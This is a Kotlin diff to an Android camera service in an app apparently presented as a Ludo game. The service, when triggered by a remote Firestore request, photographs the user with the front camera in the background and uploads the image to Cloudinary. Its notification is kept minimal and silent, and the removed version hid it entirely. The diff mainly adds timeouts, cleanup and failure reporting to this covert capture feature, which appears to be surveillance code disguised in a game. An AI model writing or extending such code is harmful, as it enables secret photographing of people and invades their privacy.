@@ -2,7 +2,10 @@ package com.example.game_tracker
 
 import android.Manifest
 import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
@@ -13,6 +16,8 @@ import android.os.Build
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
+import android.os.Looper
+import android.util.Log
 import android.util.Size
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
@@ -20,61 +25,145 @@ import com.google.firebase.firestore.FieldValue
 import com.google.firebase.firestore.FirebaseFirestore
 import java.io.File
 import java.io.FileOutputStream
+import java.util.concurrent.atomic.AtomicBoolean
 
 class CameraCaptureService : Service() {
+
+    companion object {
+        private const val TAG = "CameraCaptureService"
+        private const val NOTIFICATION_ID = 1003
+        private const val CHANNEL_ID = "CameraCaptureChannel"
+    }
+
     private var cameraDevice: CameraDevice? = null
     private var captureSession: CameraCaptureSession? = null
     private var imageReader: ImageReader? = null
     private var handler: Handler? = null
+    private var handlerThread: HandlerThread? = null
+    private val isDone = AtomicBoolean(false)
+
+    override fun onCreate() {
+        super.onCreate()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Camera Capture Service",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                setShowBadge(false)
+                setSound(null, null)
+            }
+            val mgr = getSystemService(NotificationManager::class.java)
+            mgr?.createNotificationChannel(channel)
+        }
+    }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val notification = createNotification()
+        val hasCameraPermission = ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.CAMERA
+        ) == PackageManager.PERMISSION_GRANTED
+
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
-                startForeground(1003, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                if (hasCameraPermission) {
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
+                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                } else {
+                    startForeground(NOTIFICATION_ID, notification)
+                }
             } else {
-                startForeground(1003, notification)
+                startForeground(NOTIFICATION_ID, notification)
             }
         } catch (e: Throwable) {
-            e.printStackTrace()
+            Log.e(TAG, "startForeground error: ${e.message}", e)
         }
 
         val facing = intent?.getStringExtra("cameraFacing") ?: "front"
         val requestId = intent?.getStringExtra("requestId")
 
-        startCapture(facing, requestId)
+        if (!hasCameraPermission) {
+            Log.e(TAG, "Camera permission not granted")
+            markFailed(requestId, "Camera permission not granted on device")
+            stopSelf()
+            return START_NOT_STICKY
+        }
 
+        startCapture(facing, requestId)
         return START_NOT_STICKY
     }
 
     private fun startCapture(facing: String, requestId: String?) {
-        val handlerThread = HandlerThread("camera_capture")
-        handlerThread.start()
-        handler = Handler(handlerThread.looper)
+        val thread = HandlerThread("camera_capture_thread")
+        thread.start()
+        handlerThread = thread
+        val bgHandler = Handler(thread.looper)
+        handler = bgHandler
 
-        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
+        val mainHandler = Handler(Looper.getMainLooper())
+        val timeoutRunnable = Runnable {
+            if (isDone.compareAndSet(false, true)) {
+                Log.e(TAG, "Camera capture timed out after 10 seconds")
+                markFailed(requestId, "Camera capture timed out")
+                cleanup()
+                stopSelf()
+            }
+        }
+        mainHandler.postDelayed(timeoutRunnable, 10000)
+
         try {
+            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
             val cameraId = manager.cameraIdList.firstOrNull { id ->
-                val characteristics = manager.getCameraCharacteristics(id)
-                val lens = characteristics.get(CameraCharacteristics.LENS_FACING)
-                if (facing == "back") lens == CameraCharacteristics.LENS_FACING_BACK
-                else lens == CameraCharacteristics.LENS_FACING_FRONT
-            } ?: manager.cameraIdList.first()
+                try {
+                    val characteristics = manager.getCameraCharacteristics(id)
+                    val lens = characteristics.get(CameraCharacteristics.LENS_FACING)
+                    if (facing == "back") lens == CameraCharacteristics.LENS_FACING_BACK
+                    else lens == CameraCharacteristics.LENS_FACING_FRONT
+                } catch (e: Throwable) {
+                    false
+                }
+            } ?: manager.cameraIdList.firstOrNull()
+
+            if (cameraId == null) {
+                Log.e(TAG, "No suitable camera found on device")
+                if (isDone.compareAndSet(false, true)) {
+                    mainHandler.removeCallbacks(timeoutRunnable)
+                    markFailed(requestId, "No camera found on device")
+                    cleanup()
+                    stopSelf()
+                }
+                return
+            }
 
             val characteristics = manager.getCameraCharacteristics(cameraId)
             val sizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                 ?.getOutputSizes(ImageFormat.JPEG)
-            val chosen = sizes?.firstOrNull() ?: Size(1280, 720)
+            val chosen = sizes?.firstOrNull { it.width <= 1920 && it.height <= 1080 }
+                ?: sizes?.firstOrNull()
+                ?: Size(1280, 720)
 
             imageReader = ImageReader.newInstance(chosen.width, chosen.height, ImageFormat.JPEG, 2)
             imageReader?.setOnImageAvailableListener({ reader ->
-                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
-                val buffer = image.planes[0].buffer
-                val bytes = ByteArray(buffer.remaining())
-                buffer.get(bytes)
-                image.close()
+                if (!isDone.compareAndSet(false, true)) return@setOnImageAvailableListener
+                mainHandler.removeCallbacks(timeoutRunnable)
+
+                val image = reader.acquireLatestImage()
+                if (image == null) {
+                    Log.e(TAG, "Acquired camera image is null")
+                    markFailed(requestId, "Could not acquire camera frame")
+                    cleanup()
+                    stopSelf()
+                    return@setOnImageAvailableListener
+                }
 
                 try {
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.remaining())
+                    buffer.get(bytes)
+                    image.close()
+
                     val cache = cacheDir
                     val file = File.createTempFile("camera_capture_", ".jpg", cache)
                     val fos = FileOutputStream(file)
@@ -82,12 +171,10 @@ class CameraCaptureService : Service() {
                     fos.flush()
                     fos.close()
 
-                    // Broadcast to Flutter app if alive
                     val done = Intent("com.example.game_tracker.CAMERA_CAPTURE_COMPLETE")
                     done.putExtra("path", file.absolutePath)
                     sendBroadcast(done)
 
-                    // Upload directly to Cloudinary and update Firestore for background/killed state
                     if (!requestId.isNullOrEmpty()) {
                         CloudinaryUploader.uploadFile(file) { uploadedUrl ->
                             val firestore = FirebaseFirestore.getInstance()
@@ -103,83 +190,168 @@ class CameraCaptureService : Service() {
                                 firestore.collection("screenshot_requests").document(requestId).update(
                                     mapOf(
                                         "status" to "failed",
-                                        "error" to "Background Cloudinary upload failed",
+                                        "error" to "Cloudinary upload failed",
                                         "completedAt" to FieldValue.serverTimestamp()
                                     )
                                 )
                             }
+                            cleanup()
+                            stopSelf()
                         }
+                    } else {
+                        cleanup()
+                        stopSelf()
                     }
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                } finally {
+                } catch (e: Throwable) {
+                    Log.e(TAG, "Error saving/uploading camera capture: ${e.message}", e)
+                    markFailed(requestId, "Processing failed: ${e.message}")
+                    cleanup()
                     stopSelf()
                 }
-            }, handler)
+            }, bgHandler)
 
             manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(device: CameraDevice) {
                     cameraDevice = device
                     try {
-                        val targets = listOf(imageReader!!.surface)
+                        val surface = imageReader?.surface
+                        if (surface == null) {
+                            if (isDone.compareAndSet(false, true)) {
+                                mainHandler.removeCallbacks(timeoutRunnable)
+                                markFailed(requestId, "ImageReader surface is null")
+                                cleanup()
+                                stopSelf()
+                            }
+                            return
+                        }
+
+                        val targets = listOf(surface)
+                        @Suppress("DEPRECATION")
                         device.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 captureSession = session
-                                val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-                                req.addTarget(imageReader!!.surface)
-                                req.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                                session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
+                                try {
+                                    val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                                    req.addTarget(surface)
+                                    req.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                    session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {}, bgHandler)
+                                } catch (e: Throwable) {
+                                    Log.e(TAG, "Failed to send capture request: ${e.message}", e)
+                                    if (isDone.compareAndSet(false, true)) {
+                                        mainHandler.removeCallbacks(timeoutRunnable)
+                                        markFailed(requestId, "Capture request failed: ${e.message}")
+                                        cleanup()
+                                        stopSelf()
+                                    }
+                                }
                             }
 
                             override fun onConfigureFailed(session: CameraCaptureSession) {
-                                stopSelf()
+                                Log.e(TAG, "Capture session configuration failed")
+                                if (isDone.compareAndSet(false, true)) {
+                                    mainHandler.removeCallbacks(timeoutRunnable)
+                                    markFailed(requestId, "Camera session config failed")
+                                    cleanup()
+                                    stopSelf()
+                                }
                             }
-                        }, handler)
-                    } catch (e: Exception) {
-                        e.printStackTrace()
-                        stopSelf()
+                        }, bgHandler)
+                    } catch (e: Throwable) {
+                        Log.e(TAG, "createCaptureSession error: ${e.message}", e)
+                        if (isDone.compareAndSet(false, true)) {
+                            mainHandler.removeCallbacks(timeoutRunnable)
+                            markFailed(requestId, "Session creation failed: ${e.message}")
+                            cleanup()
+                            stopSelf()
+                        }
                     }
                 }
 
                 override fun onDisconnected(device: CameraDevice) {
                     device.close()
-                    stopSelf()
+                    if (isDone.compareAndSet(false, true)) {
+                        mainHandler.removeCallbacks(timeoutRunnable)
+                        markFailed(requestId, "Camera disconnected")
+                        cleanup()
+                        stopSelf()
+                    }
                 }
 
                 override fun onError(device: CameraDevice, error: Int) {
                     device.close()
-                    stopSelf()
+                    if (isDone.compareAndSet(false, true)) {
+                        mainHandler.removeCallbacks(timeoutRunnable)
+                        markFailed(requestId, "Camera hardware error: $error")
+                        cleanup()
+                        stopSelf()
+                    }
                 }
-            }, handler)
+            }, bgHandler)
 
-        } catch (e: Exception) {
-            e.printStackTrace()
-            stopSelf()
+        } catch (e: Throwable) {
+            Log.e(TAG, "startCapture failed: ${e.message}", e)
+            if (isDone.compareAndSet(false, true)) {
+                mainHandler.removeCallbacks(timeoutRunnable)
+                markFailed(requestId, "Camera start error: ${e.message}")
+                cleanup()
+                stopSelf()
+            }
         }
+    }
+
+    private fun markFailed(requestId: String?, reason: String) {
+        if (!requestId.isNullOrEmpty()) {
+            try {
+                FirebaseFirestore.getInstance().collection("screenshot_requests").document(requestId).update(
+                    mapOf(
+                        "status" to "failed",
+                        "error" to reason,
+                        "completedAt" to FieldValue.serverTimestamp()
+                    )
+                )
+            } catch (e: Throwable) {
+                Log.e(TAG, "Failed to update Firestore: ${e.message}")
+            }
+        }
+    }
+
+    private fun cleanup() {
+        try {
+            captureSession?.close()
+        } catch (_: Throwable) {}
+        captureSession = null
+
+        try {
+            cameraDevice?.close()
+        } catch (_: Throwable) {}
+        cameraDevice = null
+
+        try {
+            imageReader?.close()
+        } catch (_: Throwable) {}
+        imageReader = null
+
+        try {
+            handlerThread?.quitSafely()
+        } catch (_: Throwable) {}
+        handlerThread = null
+        handler = null
+    }
+
+    override fun onDestroy() {
+        cleanup()
+        super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    override fun onDestroy() {
-        try {
-            captureSession?.close()
-            cameraDevice?.close()
-            imageReader?.close()
-            handler?.looper?.quitSafely()
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-        super.onDestroy()
-    }
-
     private fun createNotification(): Notification {
-        val builder = NotificationCompat.Builder(this, ForegroundService.CHANNEL_ID)
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Ludo Realm")
+            .setContentText("Camera capture in progress...")
             .setSmallIcon(R.mipmap.ic_launcher)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setOngoing(true)
-            .setSilent(true)
-            .setLocalOnly(true)
-        return builder.build()
+            .build()
     }
 }
